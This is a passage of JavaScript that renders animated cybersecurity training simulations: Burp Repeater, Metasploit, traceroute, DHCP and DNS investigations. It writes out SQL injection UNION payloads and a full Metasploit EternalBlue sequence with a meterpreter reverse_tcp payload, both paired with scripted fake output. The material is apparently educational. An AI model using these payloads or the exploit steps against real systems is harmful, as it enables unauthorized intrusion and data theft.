    if (verdict) { verdict.textContent = '// verdict: pending verification…'; verdict.className = 'nist-detail-verdict'; }
    if (phase3) phase3.classList.add('active');

    function step(i) {
      if (i >= steps.length) {
        if (verdict) { verdict.textContent = '// verdict: VULN VERIFIED — CVE-2024-1234 confirmed'; verdict.className = 'nist-detail-verdict nist-verdict-vuln'; }
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      const s = steps[i];
      s.classList.add('running');
      s.querySelector('.nist-step-state').textContent = 'running';
      timers.later(() => {
        s.classList.remove('running');
        s.classList.add('pass');
        s.querySelector('.nist-step-state').textContent = 'PASS';
        step(i + 1);
      }, 1000);
    }
    timers.later(() => step(0), 600);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- BURP SUITE — Intermediate (daily workflow) ---------- */
function buildBurpSuiteSim(skill, meta, lvl) {
  const visual = `
    <div class="burp-repeater">
      <div class="burp-pane burp-req">
        <div class="burp-pane-head">
          <span>// repeater — request</span>
          <span class="burp-pane-meta">target: app.example.com:443</span>
        </div>
        <pre class="burp-pane-body" id="burp-req-body">GET /search?q=test' HTTP/1.1
Host: app.example.com
User-Agent: Mozilla/5.0 (Burp/Repeater)
Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJ1IjoiMTAwMSJ9.abc
Accept: */*
Connection: close

</pre>
      </div>
      <div class="burp-flow">
        <span class="burp-flow-lbl">// send</span>
        <span class="burp-flow-arrow" id="burp-arrow">→</span>
        <span class="burp-flow-lbl">// receive</span>
      </div>
      <div class="burp-pane burp-resp">
        <div class="burp-pane-head">
          <span>// repeater — response</span>
          <span class="burp-pane-status" id="burp-status">—</span>
        </div>
        <pre class="burp-pane-body" id="burp-resp-body">// awaiting request…</pre>
      </div>
    </div>
  `;
  const lines = [
    '$ # burp suite — daily web app pentest workflow',
    '$ # typical daily workflow — independent troubleshooting, no escalation',
    '$ # 1. intercept request → send to Repeater',
    "$ # 2. fuzz /search?q= parameter with single quote",
    "$ # original request: GET /search?q=test HTTP/1.1",
    "$ # fuzzed  request: GET /search?q=test' HTTP/1.1",
    '$ # 3. send request — observe response',
    '[err] HTTP/1.1 500 Internal Server Error',
    '[err] pg_query(): Query failed: ERROR: unterminated quoted string',
    "[err] LINE 1: SELECT * FROM products WHERE name LIKE 'test''",
    '[err]                                                              ^',
    '$ # 4. confirm SQLi — boolean-based UNION',
    "$ # request: GET /search?q=test'+UNION+SELECT+1,2,3-- HTTP/1.1",
    '[ok] HTTP/1.1 200 OK',
    '[ok] 3 columns returned → SQLi CONFIRMED',
    '$ # 5. extract DB version banner',
    "$ # request: GET /search?q=test'+UNION+SELECT+1,version(),3-- HTTP/1.1",
    '[ok] PostgreSQL 13.4 on x86_64-pc-linux-gnu',
    '$ # 6. log finding → Burp issue tracker (SQLi-2024-007)',
    '$ # workflow complete — 1 critical SQLi, 0 false positives'
  ];

  const respLines = [
    "HTTP/1.1 500 Internal Server Error",
    "Server: nginx/1.23.4",
    "Content-Type: text/html; charset=utf-8",
    "X-Powered-By: PHP/8.2.7",
    "",
    "<b>Fatal error</b>: Uncaught PgSql\\QueryError:",
    "pg_query(): Query failed: ERROR:  unterminated quoted string",
    "LINE 1: SELECT * FROM products WHERE name LIKE 'test''",
    "                                                              ^",
    "in /var/www/api/search.php on line 47",
    "PostgreSQL 13.4 backend stack trace dumped"
  ];

  function animate(host, timers) {
    const arrow = host.querySelector('#burp-arrow');
    const status = host.querySelector('#burp-status');
    const respBody = host.querySelector('#burp-resp-body');
    if (!arrow || !status || !respBody) return;
    status.textContent = '—';
    status.className = 'burp-pane-status';
    respBody.textContent = '// awaiting request…';
    arrow.classList.remove('active');

    // Phase 1: arrow pulse
    timers.later(() => arrow.classList.add('active'), 400);
    timers.later(() => arrow.classList.remove('active'), 1400);
    // Phase 2: status flips to 500
    timers.later(() => {
      status.textContent = '500';
      status.classList.add('burp-status-err');
    }, 1500);
    // Phase 3: stream response lines
    respBody.textContent = '';
    let i = 0;
    function streamResp() {
      if (i >= respLines.length) {
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      respBody.textContent += respLines[i] + '\n';
      respBody.scrollTop = respBody.scrollHeight;
      i++;
      timers.later(streamResp, 280);
    }
    timers.later(streamResp, 1800);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- METASPLOIT — Beginner (guided walkthrough) ---------- */
function buildMetasploitSim(skill, meta, lvl) {
  const visual = `
    <div class="msf-console">
      <div class="msf-console-head">// msfconsole — metasploit framework v6.4.2-dev</div>
      <div class="msf-console-body" id="msf-body">
        <div class="msf-banner">=[ metasploit v6.4.2-dev                         ]</div>
        <div class="msf-banner">+ -- --=[ 2439 exploits - 1248 auxiliary - 410 post ]</div>
        <div class="msf-banner">+ -- --=[ 1462 payloads - 46 encoders - 11 nops    ]</div>
        <div class="msf-prompt-line"><span class="msf-prompt">msf6 &gt;</span> <span id="msf-cmd">—</span></div>
      </div>
    </div>
    <div class="msf-stages" id="msf-stages">
      <div class="msf-stage" data-i="0"><span class="msf-stage-no">1</span><span class="msf-stage-name">search ms17_010</span><span class="msf-stage-state">queued</span></div>
      <div class="msf-stage" data-i="1"><span class="msf-stage-no">2</span><span class="msf-stage-name">use exploit/.../ms17_010_eternalblue</span><span class="msf-stage-state">queued</span></div>
      <div class="msf-stage" data-i="2"><span class="msf-stage-no">3</span><span class="msf-stage-name">set RHOSTS 192.168.1.42</span><span class="msf-stage-state">queued</span></div>
      <div class="msf-stage" data-i="3"><span class="msf-stage-no">4</span><span class="msf-stage-name">set PAYLOAD .../reverse_tcp</span><span class="msf-stage-state">queued</span></div>
      <div class="msf-stage" data-i="4"><span class="msf-stage-no">5</span><span class="msf-stage-name">exploit -j</span><span class="msf-stage-state">queued</span></div>
    </div>
    <div class="msf-session">
      <span class="msf-session-lbl">// meterpreter session</span>
      <span class="msf-session-status" id="msf-session-status">// no session</span>
    </div>
  `;
  const lines = [
    '$ # metasploit — guided walkthrough @ ' + ts(),
    '$ # Goal: build familiarity with msfconsole, with documentation support',
    '$ man msfconsole',
    '[doc] msfconsole — Metasploit Framework interactive shell',
    '$ # help: launch msfconsole and locate a module',
    '$ msfconsole',
    '[ok] =[ metasploit v6.4.2-dev         ]',
    '[ok] + -- --=[ 2439 exploits - 1248 auxiliary - 410 post ]',
    '$ # step 1: search for EternalBlue (MS17-010)',
    '> search ms17_010',
    '[ok] 1  exploit/windows/smb/ms17_010_eternalblue  2017-01-01  average',
    '$ # step 2: load the module',
    '> use exploit/windows/smb/ms17_010_eternalblue',
    '[ok] [*] No active DB, manual target required',
    '$ # step 3: configure target + payload',
    '> set RHOSTS 192.168.1.42',
    '[ok] RHOSTS => 192.168.1.42',
    '> set PAYLOAD windows/x64/meterpreter/reverse_tcp',
    '[ok] PAYLOAD => windows/x64/meterpreter/reverse_tcp',
    '> set LHOST 10.0.0.5',
    '[ok] LHOST => 10.0.0.5',
    '$ # step 4: launch as background job (-j)',
    '> exploit -j',
    '[ok] [*] Started reverse TCP handler on 10.0.0.5:4444',
    '[ok] [*] 192.168.1.42:445 - Target OS: Windows 7 Pro 7601 SP1',
    '[ok] [*] Sending stage (200774 bytes) to 192.168.1.42',
    '[ok] [+] 192.168.1.42:445 - Meterpreter session 1 opened',
    '$ # → ready to progress to intermediate workflows'
  ];

  function animate(host, timers) {
    const stages = host.querySelectorAll('#msf-stages .msf-stage');
    const cmdEl = host.querySelector('#msf-cmd');
    const sessEl = host.querySelector('#msf-session-status');
    const body = host.querySelector('#msf-body');
    stages.forEach((s) => { s.classList.remove('running', 'done'); s.querySelector('.msf-stage-state').textContent = 'queued'; });
    if (cmdEl) cmdEl.textContent = '—';
    if (sessEl) { sessEl.textContent = '// no session'; sessEl.className = 'msf-session-status'; }
    // remove any prior appended msf-output lines
    body.querySelectorAll('.msf-output').forEach((n) => n.remove());

    const cmds = ['search ms17_010', 'use exploit/windows/smb/ms17_010_eternalblue', 'set RHOSTS 192.168.1.42', 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', 'exploit -j'];
    let i = 0;
    function stage() {
      if (i >= stages.length) {
        // session opened
        if (sessEl) { sessEl.textContent = '// session 1 opened @ 192.168.1.42'; sessEl.className = 'msf-session-status msf-session-open'; }
        timers.later(() => animate(host, timers), 2500);
        return;
      }
      const s = stages[i];
      s.classList.add('running');
      s.querySelector('.msf-stage-state').textContent = 'running';
      if (cmdEl) cmdEl.textContent = cmds[i];
      timers.later(() => {
        s.classList.remove('running');
        s.classList.add('done');
        s.querySelector('.msf-stage-state').textContent = 'done';
        // append a fake console output line
        if (body) {
          const out = document.createElement('div');
          out.className = 'msf-output';
          if (i === 4) {
            out.classList.add('msf-output-ok');
            out.textContent = '[+] 192.168.1.42:445 - Meterpreter session 1 opened';
          } else {
            out.textContent = '[ok] command executed';
          }
          body.appendChild(out);
          body.scrollTop = body.scrollHeight;
        }
        i++;
        stage();
      }, 1100);
    }
    timers.later(stage, 600);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ============================================================
 *  BATCH C BUILDERS — Pentest & VA
 * ============================================================ */
const BATCH_C_BUILDERS = {
  'Nmap':            buildNmapSim,
  'Wireshark':       buildWiresharkSim,
  'tcpdump':         buildTcpdumpSim,
  'OSINT Framework': buildOsintFrameworkSim,
  'OWASP Top 10':    buildOwaspTop10Sim,
  'CVSS v3.1':       buildCvssV31Sim,
  'NIST SP 800-115': buildNistSp800115Sim,
  'Burp Suite':      buildBurpSuiteSim,
  'Metasploit':      buildMetasploitSim
};

/* ============================================================
 *  BATCH D — Networking & Protocols part 1 (11 skills)
 *  Each builder produces a UNIQUE visual + animation + terminal.
 *  Distinct scenarios:
 *    1. TCP/IP       — traceroute path (9 hops, routing loop at hop 6)
 *    2. DHCP         — DORA sequence + NAK conflict (2 clients)
 *    3. DNS          — recursive lookup chain (5 hops) + NXDOMAIN flood
 *    4. HTTP/HTTPS   — curl -v session + 7-step TLS handshake + mixed content
 *    5. SIP/RTP      — REGISTER (401 challenge) + INVITE flow + 403 nonce mismatch
 *    6. SSH          — ssh session + 6-step KEX/cipher/auth + sshd_config weak-cipher audit
 *    7. TLS          — openssl s_client + 3-cert chain + deprecated TLSv1.0 offer
 *    8. TR-069/CWMP  — ACS↔CPE 6-RPC firmware push + Connection Request timeout
 *    9. ARP          — 4-host LAN + gateway real/spoof + arpwatch flip detection
 *   10. ICMP         — ping -c 4 + traceroute -I + ICMP redirect MITM alert
 *   11. GRE          — site-to-site tunnel (5 nodes) + ip tunnel/addr/link + MTU fragmentation
 * ============================================================ */

/* ---------- 1. TCP/IP — traceroute path view + routing loop ---------- */
function buildTCPIPSim(skill, meta, lvl) {
  const slug = 'tcp-ip';
  const hops = [
    { n: 1, ip: '192.168.1.1',  host: 'lan-gw.local',          rtt: 0.412 },
    { n: 2, ip: '10.0.0.1',      host: 'olt-1.isp.net',          rtt: 4.103 },
    { n: 3, ip: '172.16.0.1',    host: 'bras-1.isp.net',         rtt: 7.881 },
    { n: 4, ip: '80.81.82.1',    host: 'core-1.fra.isp.net',    rtt: 11.230 },
    { n: 5, ip: '80.81.83.1',    host: 'core-2.fra.isp.net',    rtt: 12.014 },
    { n: 6, ip: '80.81.83.1',    host: 'core-2.fra.isp.net',    rtt: 12.001, loop: true },
    { n: 7, ip: '80.81.83.1',    host: 'core-2.fra.isp.net',    rtt: 12.022, loop: true },
    { n: 8, ip: '80.81.83.1',    host: 'core-2.fra.isp.net',    rtt: 12.018, loop: true },
    { n: 9, ip: '?',             host: 'no response',            rtt: null }
  ];

  const visual = `
    <div class="vs-stage" id="tcp-stage" style="height:230px;overflow:hidden">
      <span class="vs-stage-label">// traceroute 192.168.1.42 → 8.8.8.8 — routing path</span>
      <div class="trc-list" id="tcp-trc-out">
        ${hops.map(h => `
          <div class="trc-hop" data-i="${h.n-1}">
            <span class="trc-hop-no">${h.n}</span>
            <span class="trc-hop-ip">${h.ip}</span>
            <span class="trc-hop-host">(${h.host})</span>
            <span class="trc-rtt-bar"><span class="trc-rtt-fill" style="width:0%"></span></span>
            <span class="trc-hop-rtt">${h.rtt === null ? '* * *' : h.rtt.toFixed(3) + ' ms'}</span>
          </div>
        `).join('')}
      </div>
      <div class="vs-phase-line" id="tcp-phase">// idle — awaiting traceroute</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// mtr --report 8.8.8.8</span><span id="tcp-mtr-loss">0%</span></div>
        <div class="term" id="tcp-mtr-out" style="font-size:11px;max-height:140px;overflow:auto;padding:6px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// routing-loop analysis</span><span id="tcp-anom-lbl">--</span></div>
        <div class="code-viewer" id="tcp-anom-out" style="font-size:11px;padding:8px">
          <div class="sim-h">hop 6 → TTL=1 returned from core-2</div>
          <div class="sim-p" id="tcp-anom-detail">routing loop detected at core-2.fra.isp.net (80.81.83.1)</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="tcp-kpi-loops">3</div><div class="kpi-lbl">loop cycles</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="tcp-kpi-rd">1</div><div class="kpi-lbl">route drops</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="tcp-kpi-rtt">12ms</div><div class="kpi-lbl">stable rtt</div></div>
          </div>
        </div>
      </div>
    </div>
  `;

  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ traceroute -n -q 1 8.8.8.8`,
    'traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 60 byte packets',
    ' 1  192.168.1.1     0.412 ms',
    ' 2  10.0.0.1        4.103 ms',
    ' 3  172.16.0.1      7.881 ms',
    ' 4  80.81.82.1     11.230 ms',
    ' 5  80.81.83.1     12.014 ms',
    ' 6  80.81.83.1     12.001 ms  !H1',
    ' 7  80.81.83.1     12.022 ms  !H1',
    ' 8  80.81.83.1     12.018 ms  !H1',
    ' 9  *  *  *',
    '[!] TTL=1 returned from core — routing loop suspected',
    '$ mtr --report --report-cycles 5 8.8.8.8',
    'HOST: lan-gw                   Loss%  Snt  Last  Avg  Best  Wrst',
    ' 1. 192.168.1.1                   0%    5   0.4   0.5   0.3   0.8',
    ' 2. 10.0.0.1                      0%    5   4.1   4.3   3.9   4.9',
    ' 3. 172.16.0.1                    0%    5   7.9   8.1   7.6   9.2',
    ' 4. core-1.fra.isp.net            0%    5  11.2  11.4  10.9  12.1',
    ' 5. core-2.fra.isp.net            0%    5  12.0  12.2  11.9  12.7',
    ' 6. core-2.fra.isp.net          100%    5  12.0  12.0  12.0  12.0  ← LOOP',
    '[ok] evidence captured: /tmp/trc-2025-047.pcap (84 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Escalate to ISP NOC — IGP loop on core-2',
    '$ #   2. Check OSPF/BGP adjacencies on core-1 ↔ core-2',
    '$ #   3. Validate static routes / route-map entries',
    '$ #   4. Re-test path after NOC confirms fix'
  ];

  function animate(host, timers) {
    const phase = host.querySelector('#tcp-phase');
    const hopEls = host.querySelectorAll('#tcp-trc-out .trc-hop');
    const mtrOut = host.querySelector('#tcp-mtr-out');
    const anomLbl = host.querySelector('#tcp-anom-lbl');
    if (!phase) return;
    hopEls.forEach(h => h.classList.remove('on', 'hit', 'loop'));
    hopEls.forEach(h => {
      const fill = h.querySelector('.trc-rtt-fill');
      if (fill) fill.style.width = '0%';
    });
    if (mtrOut) mtrOut.innerHTML = '';
    if (anomLbl) anomLbl.textContent = '--';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting traceroute';

    let t = 300;
    hopEls.forEach((h, i) => {
      timers.later(() => {
        h.classList.add('on');
        const fill = h.querySelector('.trc-rtt-fill');
        const d = hops[i];
        if (fill && d.rtt !== null) {
          // scale 0..30ms → 0..100%
          const pct = Math.min(100, (d.rtt / 30) * 100);
          fill.style.width = pct + '%';
        }
        if (d.loop) h.classList.add('loop');
        if (phase) phase.textContent = `// hop ${d.n} — ${d.rtt === null ? '* * *' : d.rtt.toFixed(3) + ' ms'} ${d.host}`;
      }, t);
      t += 360;
    });

    timers.later(() => {
      if (phase) { phase.innerHTML = '// <span class="err">ANOMALY</span> — TTL=1 returned from core-2 (80.81.83.1) — routing loop flagged'; phase.classList.add('err'); }
      if (anomLbl) { anomLbl.textContent = 'ROUTING LOOP'; anomLbl.style.color = 'var(--neon-3)'; }
      hopEls.forEach((h, i) => { if (hops[i].loop) h.classList.add('hit'); });
    }, t);
    timers.later(() => { phase.classList.remove('err'); phase.textContent = '// idle — awaiting next cycle'; }, t + 2400);

    if (mtrOut) {
      const mtrLines = [
        'HOST: lan-gw                  Loss% Snt  Last  Avg',
        ' 1. 192.168.1.1                  0%   5   0.4  0.5',
        ' 2. 10.0.0.1                     0%   5   4.1  4.3',
        ' 3. 172.16.0.1                   0%   5   7.9  8.1',
        ' 4. core-1.fra.isp.net           0%   5  11.2 11.4',
        ' 5. core-2.fra.isp.net           0%   5  12.0 12.2',
        ' 6. core-2.fra.isp.net         100%   5  12.0 12.0  ← LOOP'
      ];
      let mi = 0;
      timers.every(() => {
        if (mi >= mtrLines.length) return;
        const ln = document.createElement('div');
        ln.className = 'term-line';
        ln.textContent = mtrLines[mi];
        if (mtrLines[mi].includes('LOOP')) ln.classList.add('term-err');
        mtrOut.appendChild(ln);
        mtrOut.scrollTop = mtrOut.scrollHeight;
        mi++;
      }, 520);
    }
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 2. DHCP — DORA sequence + NAK conflict ---------- */
function buildDHCPSim(skill, meta, lvl) {
  const slug = 'dhcp';
  const visual = `
    <div class="vs-stage" id="dhcp-stage" style="height:200px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// DHCP DORA sequence + conflict NAK — Wireshark capture</span>
      <div class="vs-node" id="dhcp-cli-1" style="left:8%;top:30%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">💻</span><span class="vs-node-title">CLIENT A</span>
        <span class="vs-node-sub">192.168.1.42 (req)</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="dhcp-cli-2" style="left:8%;top:75%;transform:translate(-50%,-50%);opacity:.35;transition:opacity .4s">
        <span class="vs-node-ico">📱</span><span class="vs-node-title">CLIENT B</span>
        <span class="vs-node-sub">192.168.1.51 (rogue)</span><span class="vs-led"></span>
      </div>
      <div class="vs-node" id="dhcp-server" style="left:60%;top:52%;transform:translate(-50%,-50%)">
        <span class="vs-node-ico">🔌</span><span class="vs-node-title">DHCP SERVER</span>
        <span class="vs-node-sub">192.168.1.1 :67</span><span class="vs-led"></span>
      </div>
      <div class="vs-phase-line" id="dhcp-phase">// idle — awaiting DISCOVER</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// packet capture — port 67/68</span><span id="dhcp-pkt-cnt">0</span></div>
        <div class="siem-log-stream" id="dhcp-pkt-stream" style="font-size:10px;max-height:160px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// lease table</span><span>server</span></div>
        <div class="code-viewer" id="dhcp-lease-table" style="font-size:10px;padding:6px">
          <div>192.168.1.42 → aa:bb:cc:00:11:42 [BOUND]</div>
          <div>192.168.1.43 → aa:bb:cc:00:11:43 [BOUND]</div>
          <div id="dhcp-conflict-line" style="color:var(--neon-3);display:none">192.168.1.51 → CONFLICT [NAK'd]</div>
        </div>
      </div>
    </div>
  `;

  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    '$ tcpdump -i eth0 -n -vv port 67 and port 68',
    'tcpdump: listening on eth0, link-type EN10MB',
    '14:02:11.221 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from aa:bb:cc:00:11:42, len 300',
    '   Client-ID Option (61), len 7: ether aa:bb:cc:00:11:42',
    '   Parameter Request List: Subnet Mask, Router, DNS, Domain Name',
    '14:02:11.245 IP 192.168.1.1.67 > 255.255.255.255.68: BOOTP/DHCP, Reply, len 300',
    '   DHCP Option (53), len 1: DHCP Offer',
    '   IP Address Lease Time: 86400s',
    '   Server Identifier: 192.168.1.1',
    '   Address (yiaddr): 192.168.1.42',
    '14:02:11.246 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from aa:bb:cc:00:11:42',
    '   DHCP Option (53), len 1: DHCP Request',
    '   Requested IP: 192.168.1.42',
    '14:02:11.260 IP 192.168.1.1.67 > 192.168.1.42.68: BOOTP/DHCP, ACK',
    '   IP Address Lease Time: 86400s',
    '   Subnet Mask: 255.255.255.0; Router: 192.168.1.1',
    '[!] Conflict detected — 192.168.1.51 also requesting 192.168.1.42',
    '14:02:42.103 IP 0.0.0.0.68 > 255.255.255.255.67: BOOTP/DHCP, Request from 00:11:22:33:44:55',
    '14:02:42.118 IP 192.168.1.1.67 > 192.168.1.51.68: BOOTP/DHCP, NAK',
    '   DHCP Option (53), len 1: DHCP NAK — address in use',
    '[ok] conflict logged — client B will retry with new xid',
    '$ # Recommended remediation:',
    '$ #   1. Enable DHCP conflict detection (ping-check) on the server',
    '$ #   2. Audit static lease reservations for 192.168.1.42',
    '$ #   3. Inspect client B MAC — possible rogue device on LAN',
    '$ #   4. Add port-security on the access switch (limit 1 MAC/port)'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#dhcp-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 200);
    const cli1 = host.querySelector('#dhcp-cli-1');
    const cli2 = host.querySelector('#dhcp-cli-2');
    const srv = host.querySelector('#dhcp-server');
    const phase = host.querySelector('#dhcp-phase');
    const stream = host.querySelector('#dhcp-pkt-stream');
    const pktCnt = host.querySelector('#dhcp-pkt-cnt');
    const conflictLine = host.querySelector('#dhcp-conflict-line');
    // reset
    if (stream) stream.innerHTML = '';
    if (pktCnt) pktCnt.textContent = '0';
    if (conflictLine) conflictLine.style.display = 'none';
    svg.querySelectorAll('*').forEach(n => n.remove());
    [cli1, cli2, srv].forEach(n => n?.classList.remove('on', 'done', 'hit'));
    if (cli2) cli2.style.opacity = '.35';
    phase.classList.remove('err');
    phase.textContent = '// idle — awaiting DISCOVER';

    const link1 = vsLink(svg, 8, 30, 60, 52, 200, { packets: 0, color: 'var(--neon)', dur: 1.0, r: 3 });
    const link2 = vsLink(svg, 8, 75, 60, 52, 200, { packets: 0, color: 'var(--neon-3)', dur: 1.0, r: 3, hidden: true });

    const packets = [
      { dir: 'c1', label: 'DISCOVER', color: 'var(--neon)',   pkt: 'AA:BB:CC:00:11:42 → 255.255.255.255:67  DHCP DISCOVER' },
      { dir: 'srv', label: 'OFFER',   color: 'var(--neon-2)', pkt: '192.168.1.1 → 255.255.255.255:68  DHCP OFFER  yiaddr=192.168.1.42' },
      { dir: 'c1', label: 'REQUEST',  color: 'var(--neon)',   pkt: 'AA:BB:CC:00:11:42 → 255.255.255.255:67  DHCP REQUEST  192.168.1.42' },
      { dir: 'srv', label: 'ACK',     color: 'var(--neon-2)', pkt: '192.168.1.1 → 192.168.1.42:68  DHCP ACK  lease=86400s' }
    ];
    let n = 0;
    const addPkt = (txt, cls) => {
      if (stream) {
        n++;
        const ln = document.createElement('span');
        ln.className = 'siem-log-line ' + cls;
        ln.textContent = `${ts()} ${txt}`;
        stream.appendChild(ln);
        while (stream.children.length > 8) stream.removeChild(stream.firstChild);
      }
      if (pktCnt) pktCnt.textContent = String(n);
    };
    let t = 400;
    packets.forEach((p, i) => {
      timers.later(() => {
        if (phase) phase.textContent = `// ${p.label} — ${p.pkt}`;
        link1.packets(2, p.color, 0.9, 3);
        if (p.dir === 'c1') { cli1?.classList.add('on'); srv?.classList.add('on'); }
        addPkt(p.pkt, 'ok');
      }, t);
      t += 800;
    });
    timers.later(() => {
      cli1?.classList.add('done');
      if (phase) phase.textContent = '// lease granted — 192.168.1.42 bound to AA:BB:CC:00:11:42';
    }, t);
    t += 800;
    // conflict phase
    timers.later(() => {
      if (cli2) cli2.style.opacity = '1';
      cli2?.classList.add('on', 'hit');
      link2.on();
      link2.packets(2, 'var(--neon-3)', 1.0, 3);
      if (conflictLine) conflictLine.style.display = 'block';
      if (phase) { phase.innerHTML = '// <span class="err">CONFLICT</span> — Client B requests 192.168.1.42 — NAK issued'; phase.classList.add('err'); }
      addPkt('00:11:22:33:44:55 → 255.255.255.255:67  DHCP REQUEST (192.168.1.42) — CONFLICT', 'warn');
      addPkt('192.168.1.1 → 192.168.1.51:68  DHCP NAK — address in use', 'crit');
    }, t);
    t += 2400;
    timers.later(() => {
      phase.classList.remove('err');
      phase.textContent = '// idle — awaiting next cycle';
      if (cli2) cli2.style.opacity = '.35';
    }, t);
  }

  return { intro: levelIntro(skill, meta), visual, lines, animate };
}

/* ---------- 3. DNS — recursive lookup chain + NXDOMAIN flood ---------- */
function buildDNSSim(skill, meta, lvl) {
  const slug = 'dns';
  const chain = [
    { ico: '💻', name: 'CLIENT',        sub: '192.168.1.42' },
    { ico: '🌍', name: 'RECURSIVE',     sub: '10.0.0.53' },
    { ico: '🌿', name: 'ROOT',          sub: 'a.root-servers.net' },
    { ico: '🌐', name: 'TLD (.com)',    sub: 'a.gtld-servers.net' },
    { ico: '📒', name: 'AUTHORITATIVE', sub: 'ns1.google.com' }
  ];
  const visual = `
    <div class="vs-stage" id="dns-stage" style="height:240px;overflow:hidden">
      <svg class="vs-svg"></svg>
      <span class="vs-stage-label">// DNS recursive lookup chain — google.com</span>
      ${chain.map((n, i) => `
        <div class="vs-node" id="dns-hop-${i}" style="left:50%;top:${10 + i * 18}%;transform:translate(-50%,-50%)">
          <span class="vs-node-ico">${n.ico}</span><span class="vs-node-title">${n.name}</span>
          <span class="vs-node-sub">${n.sub}</span><span class="vs-led"></span>
        </div>
      `).join('')}
      <div class="vs-phase-line" id="dns-phase">// idle — awaiting dig</div>
    </div>
    <div class="siem-grid" style="margin-top:8px">
      <div class="siem-panel">
        <div class="siem-head"><span>// NXDOMAIN flood — last 30s</span><span id="dns-nxd-cnt">0</span></div>
        <div class="siem-log-stream" id="dns-nxd-stream" style="font-size:10px;max-height:120px"></div>
      </div>
      <div class="siem-panel">
        <div class="siem-head"><span>// hypothesis</span><span>C2 candidate</span></div>
        <div class="code-viewer" style="font-size:10px;padding:6px">
          <div class="sim-h">random subdomains → NXDOMAIN flood</div>
          <div class="sim-p">low-TTL + high-frequency pattern</div>
          <div class="kpi-strip" style="margin-top:6px">
            <div class="kpi-cell"><div class="kpi-val" id="dns-kpi-qps">0</div><div class="kpi-lbl">qps</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="dns-kpi-nxd">0</div><div class="kpi-lbl">nxdomain</div></div>
            <div class="kpi-cell"><div class="kpi-val" id="dns-kpi-uniq">0</div><div class="kpi-lbl">uniq sub</div></div>
          </div>
          <div id="dns-c2-flag" class="sim-p" style="color:var(--neon-3);margin-top:4px;display:none">⚠ C2 beacon candidate flagged</div>
        </div>
      </div>
    </div>
  `;
  const lines = [
    `$ # ${skill.name} — advanced investigation @ ${ts()}`,
    '$ # multi-system investigation — produces a remediation proposal',
    `$ dig +trace +nodnssec google.com`,
    '; (1 server found)',
    ';; NS resolution path:',
    ';; ROOT:  a.root-servers.net  198.41.0.4',
    ';; REFERRAL: com. NS = a.gtld-servers.net',
    ';; REFERRAL: google.com. NS = ns1.google.com',
    ';; ANSWER SECTION:',
    'google.com.            300  IN  A   142.250.74.110',
    'google.com.            300  IN  A   142.250.74.139',
    ';; Query time: 24 msec  SERVER: 10.0.0.53#53',
    '[!] NXDOMAIN flood detected — random subdomains',
    '$ tcpdump -i eth0 -n port 53 -c 50 | grep -i nxdomain',
    '14:21:08.111 IP 192.168.1.42.53124 > 10.0.0.53.53: A? x7k2-random.google.com. (40)',
    '14:21:08.114 IP 10.0.0.53.53 > 192.168.1.42.53124: 1024 6/0/0 NXDOMAIN',
    '14:21:08.221 IP 192.168.1.42.53125 > 10.0.0.53.53: A? 9f3a-random.google.com. (40)',
    '14:21:08.224 IP 10.0.0.53.53 > 192.168.1.42.53125: 6/0/0 NXDOMAIN',
    '14:21:08.335 IP 192.168.1.42.53126 > 10.0.0.53.53: A? b1c2-random.google.com. (40)',
    '14:21:08.338 IP 10.0.0.53.53 > 192.168.1.42.53126: 6/0/0 NXDOMAIN',
    '[!] 47 NXDOMAIN responses in 30s — pattern matches DNS-tunnel C2',
    '[ok] evidence captured: /tmp/dns-flood.pcap (218 KB)',
    '$ # Recommended remediation:',
    '$ #   1. Enable DNS RPZ (response policy zone) for *.google.com',
    '$ #   2. Block high-entropy/random subdomain queries at resolver',
    '$ #   3. Sinkhole affected client 192.168.1.42 — possible malware',
    '$ #   4. EDR sweep of 192.168.1.42 for DNS-tunneling agent'
  ];

  function animate(host, timers) {
    const stage = host.querySelector('#dns-stage');
    if (!stage) return;
    const svg = vsInitSvg(stage, 240);
    const nodes = host.querySelectorAll('[id^="dns-hop-"]');
    const phase = host.querySelector('#dns-phase');
    const stream = host.querySelector('#dns-nxd-stream');
    const nxdCnt = host.querySelector('#dns-nxd-cnt');
    const kpiQps = host.querySelector('#dns-kpi-qps');
    const kpiNxd = host.querySelector('#dns-kpi-nxd');
    const kpiUniq = host.querySelector('#dns-kpi-uniq');
    const c2flag = host.querySelector('#dns-c2-flag');
    // reset
    nodes.forEach(n => n.classList.remove('on', 'done', 'hit'));
    if (stream) stream.innerHTML = '';
    if (nxdCnt) nxdCnt.textContent = '0';
    if (kpiQps) kpiQps.textContent = '0';
    if (kpiNxd) kpiNxd.textContent = '0';
    if (kpiUniq) kpiUniq.textContent = '0';
